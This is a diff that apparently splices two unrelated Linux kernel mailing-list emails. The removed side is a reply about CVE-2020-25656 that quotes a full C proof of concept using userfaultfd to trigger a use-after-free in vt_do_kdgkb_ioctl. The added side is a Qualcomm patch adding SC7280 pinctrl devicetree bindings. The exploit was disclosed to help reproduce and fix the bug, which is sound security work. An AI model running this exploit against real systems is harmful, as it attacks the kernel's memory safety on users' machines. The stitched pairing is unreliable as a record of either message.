@@ -2,290 +2,245 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id A88CF28FEB4
-	for <lists+linux-kernel@lfdr.de>; Fri, 16 Oct 2020 08:58:47 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 1E1F628FEBE
+	for <lists+linux-kernel@lfdr.de>; Fri, 16 Oct 2020 08:59:51 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S2404285AbgJPG6k (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Fri, 16 Oct 2020 02:58:40 -0400
-Received: from mail-ej1-f65.google.com ([209.85.218.65]:39699 "EHLO
-        mail-ej1-f65.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S2391432AbgJPG6j (ORCPT
-        <rfc822;linux-kernel@vger.kernel.org>);
-        Fri, 16 Oct 2020 02:58:39 -0400
-Received: by mail-ej1-f65.google.com with SMTP id lw21so1610524ejb.6
-        for <linux-kernel@vger.kernel.org>; Thu, 15 Oct 2020 23:58:37 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:subject:to:references:from:message-id:date
-         :user-agent:mime-version:in-reply-to:content-language
-         :content-transfer-encoding;
-        bh=+LlmKoINson/n29f4LgBdyByONTxSrfROU25ea+hdu0=;
-        b=ZGjn4UQ9OLc+3QrzvWxaf58DcHXKW1ap2PEU1y8mK8kvoe4BqHeS7iEQdizbQEIzZo
-         2nx/xYYFe0jblo9pWG+DYNjxToE5VOgqzRXkIVP40OQlaeCgkb9Vwl9DaN5Gb0ahSCdt
-         RW84AvKZGSMXtTPWzaHY4UaYgdIowBhuyrn+nhyKJwTKELCptYFf5n6sxpXAn50qlfUD
-         3nyxeXZu7n/6ZmfoVpqbmVbnGy/wH5Vdnz2T8H2HYVqoZwHzdVIH7dlA7SyRsWxOGYAe
-         Q+qhMQSLsRd9m2IPZGbJ+B0Ufzf1KwDhaSSGdoHz4KWJPdrXADs0FEPymnb5NhFY419k
-         FPng==
-X-Gm-Message-State: AOAM531t+X5nItU0qHKewv6SrPGs3Zh+ksaBGdnFSwhNYVCkV3t3jGD4
-        Q6Ref0NMPGv3s0sI5/XIWqaBp1kcPpo=
-X-Google-Smtp-Source: ABdhPJzBXO2Q6xj6A53lssjuHwdvVgxNpvVeZ6bnEh8fg1VbMsBoUMpThgXgC7WGODimVF9NdOIX4A==
-X-Received: by 2002:a17:906:4b18:: with SMTP id y24mr2371526eju.416.1602831516283;
-        Thu, 15 Oct 2020 23:58:36 -0700 (PDT)
-Received: from ?IPv6:2a0b:e7c0:0:107::49? ([2a0b:e7c0:0:107::49])
-        by smtp.gmail.com with ESMTPSA id me12sm897053ejb.108.2020.10.15.23.58.35
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Thu, 15 Oct 2020 23:58:35 -0700 (PDT)
-Subject: Re: [oss-security] CVE-2020-25656: Linux kernel concurrency UAF in
- vt_do_kdgkb_ioctl
-To:     Minh Yuan <yuanmingbuaa@gmail.com>,
-        oss-security@lists.openwall.com,
-        Greg KH <gregkh@linuxfoundation.org>,
-        Linux kernel mailing list <linux-kernel@vger.kernel.org>
-References: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !
- gmail ! com>
-From:   Jiri Slaby <jirislaby@kernel.org>
-Message-ID: <09826e03-525c-d307-5bfe-f51cb9298e1f@kernel.org>
-Date:   Fri, 16 Oct 2020 08:58:34 +0200
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
- Thunderbird/78.3.1
-MIME-Version: 1.0
-In-Reply-To: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw () mail !
- gmail ! com>
-Content-Type: text/plain; charset=iso-8859-2; format=flowed
-Content-Language: en-US
-Content-Transfer-Encoding: 7bit
+        id S2394529AbgJPG7i (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Fri, 16 Oct 2020 02:59:38 -0400
+Received: from z5.mailgun.us ([104.130.96.5]:33549 "EHLO z5.mailgun.us"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S2394518AbgJPG7h (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+        Fri, 16 Oct 2020 02:59:37 -0400
+DKIM-Signature: a=rsa-sha256; v=1; c=relaxed/relaxed; d=mg.codeaurora.org; q=dns/txt;
+ s=smtp; t=1602831576; h=Message-Id: Date: Subject: Cc: To: From:
+ Sender; bh=xcxsmxCIUvsJlF//IDWUoNfp3dAUx1VoQAyhaIngGw0=; b=RuFYVKd8P4CB29mPb0BH8HsNDmOvwvK9a0CLymSQBFkLxirj4wlBkRHL3+NyQZ86rIdOYO2B
+ er4rTVz7JjYYZAD604wAvbAb2cVeWSzFwmKD0iOuqbo/5FrsBJ3c5MmcLkin/FzysFqAXzqO
+ NpF/PrEhbc+FMMESteqU5O+j7UQ=
+X-Mailgun-Sending-Ip: 104.130.96.5
+X-Mailgun-Sid: WyI0MWYwYSIsICJsaW51eC1rZXJuZWxAdmdlci5rZXJuZWwub3JnIiwgImJlOWU0YSJd
+Received: from smtp.codeaurora.org
+ (ec2-35-166-182-171.us-west-2.compute.amazonaws.com [35.166.182.171]) by
+ smtp-out-n04.prod.us-east-1.postgun.com with SMTP id
+ 5f8944d0588858a3043824f7 (version=TLS1.2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256); Fri, 16 Oct 2020 06:59:27
+ GMT
+Sender: rnayak=codeaurora.org@mg.codeaurora.org
+Received: by smtp.codeaurora.org (Postfix, from userid 1001)
+        id 2628EC43382; Fri, 16 Oct 2020 06:59:27 +0000 (UTC)
+X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
+        aws-us-west-2-caf-mail-1.web.codeaurora.org
+X-Spam-Level: 
+X-Spam-Status: No, score=-2.9 required=2.0 tests=ALL_TRUSTED,BAYES_00,SPF_FAIL,
+        URIBL_BLOCKED autolearn=no autolearn_force=no version=3.4.0
+Received: from blr-ubuntu-173.qualcomm.com (blr-bdr-fw-01_GlobalNAT_AllZones-Outside.qualcomm.com [103.229.18.19])
+        (using TLSv1.2 with cipher ECDHE-RSA-AES128-SHA256 (128/128 bits))
+        (No client certificate requested)
+        (Authenticated sender: rnayak)
+        by smtp.codeaurora.org (Postfix) with ESMTPSA id 7AAA8C433F1;
+        Fri, 16 Oct 2020 06:59:21 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.3.2 smtp.codeaurora.org 7AAA8C433F1
+Authentication-Results: aws-us-west-2-caf-mail-1.web.codeaurora.org; dmarc=none (p=none dis=none) header.from=codeaurora.org
+Authentication-Results: aws-us-west-2-caf-mail-1.web.codeaurora.org; spf=fail smtp.mailfrom=rnayak@codeaurora.org
+From:   Rajendra Nayak <rnayak@codeaurora.org>
+To:     agross@kernel.org, bjorn.andersson@linaro.org,
+        linus.walleij@linaro.org, robh+dt@kernel.org
+Cc:     linux-arm-msm@vger.kernel.org, linux-gpio@vger.kernel.org,
+        devicetree@vger.kernel.org, linux-kernel@vger.kernel.org,
+        Rajendra Nayak <rnayak@codeaurora.org>
+Subject: [PATCH 1/2] dt-bindings: pinctrl: qcom: Add sc7280 pinctrl bindings
+Date:   Fri, 16 Oct 2020 12:28:51 +0530
+Message-Id: <1602831532-24818-1-git-send-email-rnayak@codeaurora.org>
+X-Mailer: git-send-email 2.7.4
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Cc Greg.
+Add device tree binding Documentation details for Qualcomm SC7280
+TLMM block.
 
-On 16. 10. 20, 5:39, Minh Yuan wrote:
-> Hi,
-> 
-> We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
-> version 3.4 to the latest version (v5.9 for now).
-> 
-> The root cause of this vulnerability is that there exits a race in
-> KDGKBSENT and KDSKBSENT.
-> 
-> Here are details:
-> 1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
-> 2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
-> func_table, at the same time, due to KDGKBSENT has no lock, we can use
-> KDSKBSENT again to allocate a larger buffer than step1, and the old
-> funcbufptr will be freed. However, we've obtained the heap pointer in
-> KDGKBSENT, so a uaf read will happen while executing put_user.
+Signed-off-by: Rajendra Nayak <rnayak@codeaurora.org>
+---
+ .../bindings/pinctrl/qcom,sc7280-pinctrl.yaml      | 170 +++++++++++++++++++++
+ 1 file changed, 170 insertions(+)
+ create mode 100644 Documentation/devicetree/bindings/pinctrl/qcom,sc7280-pinctrl.yaml
 
-Hi,
-
-this is likely the issue I am fixing at:
-https://git.kernel.org/pub/scm/linux/kernel/git/jirislaby/linux.git/commit/?h=devel&id=57c85191e788e172a446e34ef77d34473cfb1e8d
-
-I think, it won't apply cleanly as it's a part of a larger set. I will 
-reorder the patch and send something during the day.
-
-Thanks.
-
-> I've successfully reproduced this bug in a special way.
-> However, to write a universal PoC for anyone else to reproduce it,  I use
-> userfaultfd to handle the order of "free" and "use" in multithreading
-> environment. This is my PoC:
-> 
-> // author by ziiiro@thu
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <unistd.h>
-> #include <sys/ioctl.h>
-> #include <string.h>
-> #include <sys/types.h>
-> #include <sys/stat.h>
-> #include <fcntl.h>
-> #include <sys/mman.h>
-> #include <poll.h>
-> #include <pthread.h>
-> #include <errno.h>
-> #include <stdlib.h>
-> #include <signal.h>
-> #include <string.h>
-> #include <sys/syscall.h>
-> #include <linux/userfaultfd.h>
-> #include <pthread.h>
-> #include <poll.h>
-> #include <linux/prctl.h>
-> #include <stdint.h>
-> 
-> #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
->                         } while (0)
-> 
-> #define KDGKBSENT 0x4B48 /* gets one function key string entry */
-> #define KDSKBSENT 0x4B49 /* sets one function key string entry */
-> 
-> struct kbsentry {
-> unsigned char kb_func;
-> unsigned char kb_string[512];
-> };
-> int fd;
-> static int page_size;
-> static void *fault_handler_thread(void *arg) {
->    unsigned long value;
->    static struct uffd_msg msg;
->    static int fault_cnt = 0;
->    long uffd;
->    static char *page = NULL;
->    struct uffdio_copy uffdio_copy;
->    int len, i;
->    if (page == NULL) {
->      page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
->                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
->      if (page == MAP_FAILED) errExit("mmap (userfaultfd)");
->    }
->    uffd = (long)arg;
-> 
->    for(;;) {
->      struct pollfd pollfd;
->      pollfd.fd = uffd;
->      pollfd.events = POLLIN;
->      len = poll(&pollfd, 1, -1);
-> 
-> 
->      read(uffd, &msg, sizeof(msg));
->      printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
->      printf("    address = 0x%lx\n", msg.arg.pagefault.address);
->      switch(fault_cnt) {
->          case 0:
->              puts("triggered in the first page!");
->              break;
->          case 1:
->              puts("triggered in the seccond page!");
->              munmap((void*)0x233000,page_size);
->              void *addr = (void*)mmap((void*)0x233000,
->                          page_size,
->                          PROT_READ | PROT_WRITE,
->                          MAP_FIXED | MAP_PRIVATE | MAP_ANON,
->                          -1, 0);
->              if ((unsigned long)addr != 0x233000)
->                  errExit("mmap (0x233000)");
->              // register 0x233000 again to trigger put_user
->              struct uffdio_register uffdio_register;
->              uffdio_register.range.start = (unsigned long)addr;
->              uffdio_register.range.len   = page_size;
->              uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
->              if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
->                  errExit("ioctl: UFFDIO_REGITER");
->              break;
->          case 2:
->              puts("triggered in put_user!");
->              struct kbsentry *kbs;
->              kbs = malloc(sizeof(struct kbsentry));
->              kbs->kb_func = 0;
-> 
-> strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=
-> bbbbbbbbb");
->              // free old funcbufptr
->              ioctl(fd,KDSKBSENT,kbs);
->              break;
-> 
->      }
->      // return to kernel-land
->      uffdio_copy.src = (unsigned long)page;
->      uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
-> ~(page_size - 1);
->      uffdio_copy.len = page_size;
->      uffdio_copy.mode = 0;
->      uffdio_copy.copy = 0;
->      if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
->          errExit("ioctl: UFFDIO_COPY");
-> 
->      fault_cnt++;
-> 
->    }
-> }
-> // use userfaultfd to handle free->use
-> void setup_pagefault(void *addr, unsigned size) {
->    long uffd;
->    pthread_t th;
->    struct uffdio_api uffdio_api;
->    struct uffdio_register uffdio_register;
->    int s;
->    // new userfaulfd
-> 
->    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
->    if (uffd == -1) errExit("userfaultfd");
->    // enabled uffd object
->    uffdio_api.api = UFFD_API;
->    uffdio_api.features = 0;
->    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) errExit("ioctl:
-> UFFDIO_API");
->    // register memory address
->    uffdio_register.range.start = (unsigned long)addr;
->    uffdio_register.range.len   = size;
->    uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
-> //UFFDIO_REGISTER_MODE_WP;//
->    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) errExit("io=
-> ctl:
-> UFFDIO_REGITER");
->    // monitor page fault
->    s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
->    if (s != 0) errExit("pthread_create");
-> }
-> 
-> 
-> int main(int argc, char** argv)
-> {
->          struct kbsentry *kbs;
->          pthread_t th;
->          page_size = sysconf(_SC_PAGE_SIZE);
->          void *addr = (void*)mmap((void*)0x233000,
->                              page_size * 2,
->                              PROT_READ | PROT_WRITE,
->                              MAP_FIXED | MAP_PRIVATE | MAP_ANON,
->                              -1, 0);
->          if ((unsigned long)addr != 0x233000)
->              errExit("mmap (0x233000)");
->          setup_pagefault(addr, page_size * 2);
->          kbs = malloc(sizeof(struct kbsentry));
->          kbs->kb_func = 0;
->          fd = open("/dev/tty1", O_RDONLY, 0);
-> 
-> strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
-> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=
-> a");
->          // allocate a lager funcbufptr
->          ioctl(fd,KDSKBSENT,kbs);
->          // use KDGKBSENT to access the new funcbufptr
->          ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
->          return 1;
-> 
-> }
-> 
-> Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=y
-> is also needed. Besides, it needs the privilege to access tty to trigger
-> this bug.
-> 
-> We've noticed that this bug was also discovered by Syzbot 8 months ago, but
-> no one has successfully reproduced it (
-> https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
-> leaving this issue ignored and upatched yet. Hope this PoC can help
-> someone.
-> 
-> Timeline:
-> * 10.15.20 - Vulnerability reported to security@kernel.org and
-> linux-distros@vs.openwall.org.
-> * 10.15.20 - CVE-2020-25656 assigned.
-> * 10.16.20 - Vulnerability opened.
-> 
-> Thanks,
-> Yuan Ming and Bodong Zhao, Tsinghua University
-> 
-
-
+diff --git a/Documentation/devicetree/bindings/pinctrl/qcom,sc7280-pinctrl.yaml b/Documentation/devicetree/bindings/pinctrl/qcom,sc7280-pinctrl.yaml
+new file mode 100644
+index 0000000..971cfaf
+--- /dev/null
++++ b/Documentation/devicetree/bindings/pinctrl/qcom,sc7280-pinctrl.yaml
+@@ -0,0 +1,170 @@
++# SPDX-License-Identifier: (GPL-2.0-only OR BSD-2-Clause)
++%YAML 1.2
++---
++$id: http://devicetree.org/schemas/pinctrl/qcom,sc7280-pinctrl.yaml#
++$schema: http://devicetree.org/meta-schemas/core.yaml#
++
++title: Qualcomm Technologies, Inc. SC7280 TLMM block
++
++maintainers:
++  - Rajendra Nayak <rnayak@codeaurora.org>
++
++description: |
++  This binding describes the Top Level Mode Multiplexer block found in the
++  SC7280 platform.
++
++properties:
++  compatible:
++    const: qcom,sc7280-pinctrl
++
++  reg:
++    maxItems: 1
++
++  interrupts:
++    description: Specifies the TLMM summary IRQ
++    maxItems: 1
++
++  interrupt-controller: true
++
++  '#interrupt-cells':
++    description:
++      Specifies the PIN numbers and Flags, as defined in defined in
++      include/dt-bindings/interrupt-controller/irq.h
++    const: 2
++
++  gpio-controller: true
++
++  '#gpio-cells':
++    description: Specifying the pin number and flags, as defined in
++      include/dt-bindings/gpio/gpio.h
++    const: 2
++
++  gpio-ranges:
++    maxItems: 1
++
++  wakeup-parent:
++    maxItems: 1
++
++#PIN CONFIGURATION NODES
++patternProperties:
++  '-pins$':
++    type: object
++    description:
++      Pinctrl node's client devices use subnodes for desired pin configuration.
++      Client device subnodes use below standard properties.
++    $ref: "/schemas/pinctrl/pincfg-node.yaml"
++
++    properties:
++      pins:
++        description:
++          List of gpio pins affected by the properties specified in this
++          subnode.
++        items:
++          oneOf:
++            - pattern: "^gpio([0-9]|[1-9][0-9]|1[0-7][0-4])$"
++            - enum: [ sdc1_rclk, sdc1_clk, sdc1_cmd, sdc1_data, sdc2_clk,
++                      sdc2_cmd, sdc2_data, ufs_reset ]
++        minItems: 1
++        maxItems: 16
++
++      function:
++        description:
++          Specify the alternative function to be configured for the specified
++          pins.
++
++        enum: [ atest_char, atest_char0, atest_char1, atest_char2,
++                atest_char3, atest_usb0, atest_usb00, atest_usb01,
++                atest_usb02, atest_usb03, atest_usb1, atest_usb10,
++                atest_usb11, atest_usb12, atest_usb13, audio_ref,
++                cam_mclk, cci_async, cci_i2c, cci_timer0, cci_timer1,
++                cci_timer2, cci_timer3, cci_timer4, cmu_rng0, cmu_rng1,
++                cmu_rng2, cmu_rng3, coex_uart1, cri_trng, cri_trng0,
++                cri_trng1, dbg_out, ddr_bist, ddr_pxi0, ddr_pxi1, dp_hot,
++                dp_lcd, edp_hot, edp_lcd, gcc_gp1, gcc_gp2, gcc_gp3,
++                gpio, host2wlan_sol, ibi_i3c, jitter_bist, lpass_slimbus,
++                mdp_vsync, mdp_vsync0, mdp_vsync1, mdp_vsync2, mdp_vsync3,
++                mdp_vsync4, mdp_vsync5, mi2s0_data0, mi2s0_data1, mi2s0_sck,
++                mi2s0_ws, mi2s1_data0, mi2s1_data1, mi2s1_sck, mi2s1_ws,
++                mi2s2_data0, mi2s2_data1, mi2s2_sck, mi2s2_ws, mss_grfc0,
++                mss_grfc1, mss_grfc10, mss_grfc11, mss_grfc12, mss_grfc2,
++                mss_grfc3, mss_grfc4, mss_grfc5, mss_grfc6, mss_grfc7,
++                mss_grfc8, mss_grfc9, nav_gpio0, nav_gpio1, nav_gpio2,
++                pa_indicator, pcie0_clkreqn, pcie1_clkreqn, phase_flag0,
++                phase_flag1, phase_flag10, phase_flag11, phase_flag12,
++                phase_flag13, phase_flag14, phase_flag15, phase_flag16,
++                phase_flag17, phase_flag18, phase_flag19, phase_flag2,
++                phase_flag20, phase_flag21, phase_flag22, phase_flag23,
++                phase_flag24, phase_flag25, phase_flag26, phase_flag27,
++                phase_flag28, phase_flag29, phase_flag3, phase_flag30,
++                phase_flag31, phase_flag4, phase_flag5, phase_flag6,
++                phase_flag7, phase_flag8, phase_flag9, pll_bist,
++                pll_bypassnl, pll_clk, pll_reset, pri_mi2s, prng_rosc,
++                qdss_cti, qdss_gpio, qdss_gpio0, qdss_gpio1, qdss_gpio10,
++                qdss_gpio11, qdss_gpio12, qdss_gpio13, qdss_gpio14,
++                qdss_gpio15, qdss_gpio2, qdss_gpio3, qdss_gpio4, qdss_gpio5,
++                qdss_gpio6, qdss_gpio7, qdss_gpio8, qdss_gpio9,
++                qlink0_enable, qlink0_request, qlink0_wmss, qlink1_enable,
++                qlink1_request, qlink1_wmss, qspi_clk, qspi_cs, qspi_data,
++                qup00, qup01, qup02, qup03, qup04, qup05, qup06, qup07,
++                qup10, qup11, qup12, qup13, qup14, qup15, qup16, qup17,
++                sdc40, sdc41, sdc42, sdc43, sdc4_clk, sdc4_cmd, sd_write,
++                sec_mi2s, tb_trig, tgu_ch0, tgu_ch1, tsense_pwm1,
++                tsense_pwm2, uim0_clk, uim0_data, uim0_present, uim0_reset,
++                uim1_clk, uim1_data, uim1_present, uim1_reset, usb2phy_ac,
++                usb_phy, vfr_0, vfr_1, vsense_trigger ]
++
++      drive-strength:
++        enum: [2, 4, 6, 8, 10, 12, 14, 16]
++        default: 2
++        description:
++          Selects the drive strength for the specified pins, in mA.
++
++      bias-pull-down: true
++
++      bias-pull-up: true
++
++      bias-disable: true
++
++      output-high: true
++
++      output-low: true
++
++    required:
++      - pins
++      - function
++
++    additionalProperties: false
++
++required:
++  - compatible
++  - reg
++  - interrupts
++  - interrupt-controller
++  - '#interrupt-cells'
++  - gpio-controller
++  - '#gpio-cells'
++  - gpio-ranges
++
++additionalProperties: false
++
++examples:
++  - |
++        #include <dt-bindings/interrupt-controller/arm-gic.h>
++        tlmm: pinctrl@f000000 {
++                compatible = "qcom,sc7280-pinctrl";
++                reg = <0xf000000 0x1000000>;
++                interrupts = <GIC_SPI 208 IRQ_TYPE_LEVEL_HIGH>;
++                gpio-controller;
++                #gpio-cells = <2>;
++                interrupt-controller;
++                #interrupt-cells = <2>;
++                gpio-ranges = <&tlmm 0 0 175>;
++                wakeup-parent = <&pdc>;
++
++                qup_uart5_default: qup-uart5-pins {
++                        pins = "gpio46", "gpio47";
++                        function = "qup13";
++                        drive-strength = <2>;
++                        bias-disable;
++                };
++        };
 -- 
-js
-suse labs
+QUALCOMM INDIA, on behalf of Qualcomm Innovation Center, Inc. is a member
+of Code Aurora Forum, hosted by The Linux Foundation
+
